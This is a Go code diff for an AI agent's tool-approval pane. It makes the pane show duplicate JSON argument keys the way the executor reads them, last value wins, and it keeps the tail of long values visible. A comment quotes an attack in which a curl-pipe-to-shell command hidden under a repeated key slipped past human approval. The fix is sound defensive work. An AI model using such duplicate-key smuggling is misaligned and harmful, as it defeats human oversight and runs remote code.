@@ -2203,6 +2203,15 @@ const argumentValueIndent = "  "
 // the transcript block then collapses to the house budget like any other body (render.go), which is
 // a question about how many of these lines a surface seats, not about what they say.
 //
+// A key the model wrote TWICE is shown ONCE, carrying the value the tool will receive and marked as
+// the duplicate it is (duplicateKeyNote). The pane may not be the one surface in the process that
+// reads a call differently from everything else acting on it: the executor's decode
+// (internal/tools.decodeArgs) is stdlib JSON, where the last duplicate wins, and both guards are
+// last-wins too (security/dangerous.go, tools/workspace_scoped.go). Streaming every duplicate in
+// wire order let `{"command":"npm test","command":"curl …|sh"}` be approved off a line the executor
+// discards — so the surviving pair sits where its winning value arrived, in wire order among the
+// other survivors, and the note says the earlier ones existed rather than hiding them.
+//
 // The NAME is flattened (flattenField) and the value is not, which is the same line drawn twice. A
 // name is a label: nothing in it is layout, so a newline in one is not a longer label but a SECOND
 // line, unindented, wearing whatever the model wrote it as — on the approval prompt that is a row
@@ -2216,7 +2225,11 @@ func argumentDetails(raw json.RawMessage) []detailLine {
 	}
 	var details []detailLine
 	for _, p := range pairs {
-		details = append(details, detailLine{Text: flattenField(p.name) + ":"})
+		label := flattenField(p.name) + ":"
+		if p.occurrences > 1 {
+			label += duplicateKeyNote(p.occurrences)
+		}
+		details = append(details, detailLine{Text: label})
 		for _, ln := range argumentValueLines(p.value) {
 			details = append(details, detailLine{Text: argumentValueIndent + ln})
 		}
@@ -2224,11 +2237,21 @@ func argumentDetails(raw json.RawMessage) []detailLine {
 	return details
 }
 
+// duplicateKeyNote is what a label says when the model wrote that key more than once: which of the
+// values is on the screen, and — by saying it at all — that there were others. It rides the LABEL
+// rather than the value so the value beneath it is still nothing but the bytes the tool receives.
+func duplicateKeyNote(occurrences int) string {
+	return fmt.Sprintf("  (duplicate key — last of %d wins)", occurrences)
+}
+
 // argumentPair is one argument as the model wrote it: its name, and its value still encoded, so the
 // value's own rendering (argumentValueLines) decides what shape it takes on the screen.
+// occurrences is how many times that name appeared in the call — 1 for an ordinary argument, more
+// where the model repeated a key and this pair carries the last value it wrote (orderedArgs).
 type argumentPair struct {
-	name  string
-	value json.RawMessage
+	name        string
+	value       json.RawMessage
+	occurrences int
 }
 
 // orderedArgs decodes a tool call's arguments into name/value pairs in WIRE order, reporting false
@@ -2236,6 +2259,10 @@ type argumentPair struct {
 // object, a blob that does not parse, or one carrying anything after its closing brace. Every false
 // leaves the caller to show the arguments as they arrived: half a labelled rendering of a malformed
 // blob would be a claim about the call that the bytes do not support.
+//
+// A repeated key yields ONE pair, carrying the LAST value the model wrote for it and counting the
+// occurrences, because that is the value everything downstream acts on (argumentDetails states the
+// rule and why the pane may not differ from it).
 func orderedArgs(raw json.RawMessage) ([]argumentPair, bool) {
 	trimmed := strings.TrimSpace(string(raw))
 	if trimmed == "" || trimmed == "null" {
@@ -2274,16 +2301,56 @@ func orderedArgs(raw json.RawMessage) ([]argumentPair, bool) {
 	if _, err := dec.Token(); !errors.Is(err, io.EOF) {
 		return nil, false
 	}
-	return pairs, true
+	return lastWins(pairs), true
 }
+
+// lastWins collapses repeated keys the way every consumer of the same bytes does: one pair per
+// name, holding the value of its LAST occurrence and standing at that occurrence's place among the
+// survivors, with the occurrence count carried through so the label can say the key was repeated.
+func lastWins(pairs []argumentPair) []argumentPair {
+	occurrences := make(map[string]int, len(pairs))
+	last := make(map[string]int, len(pairs))
+	for i, p := range pairs {
+		occurrences[p.name]++
+		last[p.name] = i
+	}
+	out := make([]argumentPair, 0, len(occurrences))
+	for i, p := range pairs {
+		if last[p.name] != i {
+			continue
+		}
+		p.occurrences = occurrences[p.name]
+		out = append(out, p)
+	}
+	return out
+}
+
+// argumentValueMaxLines is the most lines ONE argument's value may spend on the surfaces that show
+// a call's arguments. It exists so no single value can evict its siblings: the approval pane's body
+// budget is a handful of rows on a stock 80×24 window (popupBudget), so an uncapped two-hundred-line
+// `content` took every row the pane had and the `path:` it was being written to never reached the
+// screen. Eight is long enough to read a command or a short file off, short enough that a two- or
+// three-argument call still shows every label it has.
+const argumentValueMaxLines = 8
 
 // argumentValueLines renders one argument's value as the lines that sit under its label: a string as
 // its OWN lines, so the newline a JSON blob spells `\n` is a line break here; any other scalar as
 // the literal the model sent (a `null` says null rather than going quiet, which is why only a
-// decoded STRING takes the first exit); and a value with no flat shape as indented JSON. It
-// truncates nothing and wraps nothing — how many of these lines a surface can seat is that
-// surface's own business.
+// decoded STRING takes the first exit); and a value with no flat shape as indented JSON.
+//
+// It wraps nothing — how WIDE these lines may be is the surface's own business — but it does bound
+// how MANY there are (argumentValueMaxLines), and an elided value keeps its TAIL as well as its
+// head: head lines, the elision marker counting what is not shown, then the value's LAST line
+// (elisionSplit, popup.go, is the shared rule, and popupElisionMarker the one wording for the fact).
+// A value's last line is where a payload appended to an innocent-looking body lives, and a surface
+// that shows only heads is one an approval can be given on falsely.
 func argumentValueLines(value json.RawMessage) []string {
+	return elideValueLines(decodedValueLines(value))
+}
+
+// decodedValueLines is argumentValueLines' rendering before its cap: the value's real lines, however
+// many it has.
+func decodedValueLines(value json.RawMessage) []string {
 	var decoded any
 	if err := json.Unmarshal(value, &decoded); err == nil {
 		if s, isString := decoded.(string); isString {
@@ -2295,6 +2362,20 @@ func argumentValueLines(value json.RawMessage) []string {
 		return splitLines(strings.TrimSpace(string(value)))
 	}
 	return splitLines(buf.String())
+}
+
+// elideValueLines seats lines in argumentValueMaxLines rows, head + marker + tail (elisionSplit),
+// and returns a short-enough value untouched.
+func elideValueLines(lines []string) []string {
+	head, tail, hidden := elisionSplit(len(lines), argumentValueMaxLines)
+	if hidden == 0 {
+		return lines
+	}
+	out := make([]string, 0, head+1+tail)
+	out = append(out, lines[:head]...)
+	out = append(out, popupElisionMarker(hidden))
+	out = append(out, lines[len(lines)-tail:]...)
+	return out
 }
 
 // firstLine returns the first line of s (without its newline), or s when it has none.
